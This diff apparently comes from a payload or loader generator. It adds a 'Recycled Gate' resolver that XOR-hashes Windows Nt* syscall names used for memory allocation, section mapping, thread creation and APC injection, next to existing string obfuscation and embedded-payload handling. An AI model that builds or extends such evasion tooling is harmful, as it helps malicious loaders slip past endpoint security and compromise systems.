@@ -16,6 +16,10 @@ def _djb2_hash(s):
         hash_val = ((hash_val << 5) + hash_val) + ord(char)
     return hash_val & 0xFFFFFFFF # Return as a 32-bit unsigned integer
 
+def _djb2_hash_xor(s, key=0x41424344):
+    """Calculates the DJB2 hash and XORs it with a key (for Recycled Gate)."""
+    return _djb2_hash(s) ^ key
+
 def _obfuscate_string(string_data, key):
     """Obfuscates a string using a byte-wise subtraction and returns a C-style byte array."""
     if not string_data:
@@ -83,6 +87,18 @@ def _prepare_template_context(options, manifest_data, payload_bytes=None):
     template_vars['api_resolver_partial'] = f"partials/api_resolver_{api_resolver_choice}.c.j2"
     if api_resolver_choice == 'hashed':
         template_vars.update(_get_api_hashes())
+    elif api_resolver_choice == 'recycled_gate':
+        # Standard hashes are still needed for some Kernel32 functions (like LoadLibrary/GetProcAddress for initial setup if needed, or fallback)
+        template_vars.update(_get_api_hashes())
+        # Add Recycled Gate specific hashes (XORed)
+        # We need the Nt* equivalents of the functions we use.
+        rg_api_names = [
+            "NtAllocateVirtualMemory", "NtProtectVirtualMemory", "NtCreateThreadEx", 
+            "NtWaitForSingleObject", "NtCreateSection", "NtMapViewOfSection", 
+            "NtWriteVirtualMemory", "NtQueueApcThread", "NtClose", "NtFreeVirtualMemory"
+        ]
+        for name in rg_api_names:
+            template_vars[f"hash_rg_{name.lower()}"] = _djb2_hash_xor(name)
 
     data_source_choice = options.get('data_source', 'embedded')
     template_vars['data_source'] = data_source_choice
